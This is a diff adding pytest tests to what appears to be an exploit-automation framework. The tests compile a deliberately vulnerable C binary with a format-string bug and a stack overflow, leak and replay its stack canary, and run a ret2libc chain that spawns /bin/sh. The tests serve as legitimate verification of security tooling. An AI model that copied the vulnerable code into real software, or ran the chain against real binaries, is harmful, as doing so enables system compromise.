@@ -208,3 +208,80 @@ def test_exploit_stage_files_l3_pie_ret2libc(store, case, pool, pie_leak_bin):
     pocs = PocDAO(store.conn).list_by_target(t.id)
     assert any(pc.level == "L3" and pc.verified for pc in pocs), \
         f"no confirmed L3 PIE ret2libc (pocs={[(p.level, p.verified) for p in pocs]})"
+
+
+def test_find_canary_and_prefix():
+    """find_canary picks the low-byte-0x00 high-entropy word out of a leak and ignores pointers;
+    build_canary_prefix writes it back at the right slot."""
+    import struct
+    canary = 0x8722C75DC372EC00
+    vals = [0x7FFDFF9A29B0, 0x40, 0x711199EA03E6, canary, 0x401274]   # stack, small, libc, CANARY, code
+    assert rop.find_canary(vals) == canary
+    assert rop.find_canary([0x7FFDFF9A29B0, 0x401274]) is None        # no canary present
+    pre = rop.build_canary_prefix(72, canary, 88)
+    assert len(pre) == 88 and struct.unpack_from("<Q", pre, 72)[0] == canary
+    assert pre[:72] == b"A" * 72 and pre[80:88] == b"B" * 8
+
+
+@pytest.fixture
+def canary_bin(tmp_path_factory):
+    from lykos.analyze.dynamic import sandbox
+    if sandbox.host_arch() != "x86-64":
+        pytest.skip("x86-64 native only")
+    if not _SYS_LIBC:
+        pytest.skip("no system libc")
+    gcc = shutil.which("gcc") or shutil.which("cc")
+    if not gcc:
+        pytest.skip("no C compiler")
+    d = tmp_path_factory.mktemp("canary")
+    (d / "v.c").write_text(
+        '#include <stdio.h>\n#include <unistd.h>\n'
+        '__asm__(".text\\n.global g\\n g: pop %rdi\\n ret\\n");\n'
+        'void vuln(){ char b[64]; read(0,b,64); printf(b); puts("go"); read(0,b,400); }\n'
+        'int main(){ setvbuf(stdout,0,2,0); while(1) vuln(); return 0; }\n')
+    exe = d / "v"
+    if subprocess.run([gcc, "-no-pie", "-fstack-protector-all", "-w",
+                       str(d / "v.c"), "-o", str(exe)], capture_output=True).returncode:
+        pytest.skip("cannot build canary fixture")
+    return exe
+
+
+def test_canary_ret2libc_spawns_shell(canary_bin):
+    """A canary-protected no-PIE binary is exploited to a shell: the canary is leaked via the format
+    string and written back, then a two-stage puts-leak ret2libc runs system("/bin/sh")."""
+    from lykos.analyze.poc import exploit as ex
+    data = canary_bin.read_bytes()
+    ld = open(_SYS_LIBC, "rb").read()
+    syms = rop.libc_symbols(ld, ("puts", "system"))
+    res = leak.canary_ret2libc(
+        canary_bin, canary_bin.parent, offset=88, canary_offset=72, ret_offset=88,
+        canary_trigger=b"%p" + b".%p" * 19 + b"\n", pop_rdi=rop.find_gadget(data, "pop_rdi"),
+        puts_plt=rop.resolve_plt(str(canary_bin), "puts"), puts_got=rop.got_entry(data, "puts"),
+        ret_to=ex.elf_functions(data).get("main"), ret_gadget=rop.find_gadget(data, "ret"),
+        puts_off=syms["puts"], system_off=syms["system"], binsh_off=rop.find_string(ld, b"/bin/sh"),
+        loop_feed=b"A\n", timeout=8.0)
+    assert res["ok"], f"canary ret2libc did not spawn a shell: {res.get('reason')}"
+    assert (res["canary"] & 0xFF) == 0                       # a real canary: null low byte
+
+
+def test_exploit_stage_files_l3_canary_ret2libc(store, case, pool, canary_bin):
+    """End-to-end through the ladder with strategy=canary: a canary-protected no-PIE binary is
+    driven to a CONFIRMED L3 ret2libc, leaking and replaying the canary."""
+    from lykos.analyze.ingest import enqueue_triage, ingest
+    from lykos.analyze.poc import enqueue_exploit
+    from lykos.db.dao import PocDAO, TargetDAO
+    from lykos.jobs import JobQueue
+    t = ingest(store, case.id, canary_bin, filename="v")
+    q = JobQueue(store.conn)
+    enqueue_triage(q, t, force=True)
+    assert pool.wait_idle(30)
+    TargetDAO(store.conn).update_triage(t.id, arch="x86-64", bits=64, endianness="little",
+                                        linking="dynamic", stripped=False,
+                                        mitigations={"pie": "off", "canary": "on"}, file_type="elf")
+    run = enqueue_exploit(q, t, params={"strategy": "canary", "offset": 88, "canary_offset": 72,
+                                        "ret_offset": 88, "canary_trigger": "%p" + ".%p" * 19 + "\n",
+                                        "loop_feed": "A\n"})
+    assert pool.wait_idle(90) and q.runs.get(run.id).status == "done"
+    pocs = PocDAO(store.conn).list_by_target(t.id)
+    assert any(pc.level == "L3" and pc.verified for pc in pocs), \
+        f"no confirmed L3 canary ret2libc (pocs={[(p.level, p.verified) for p in pocs]})"
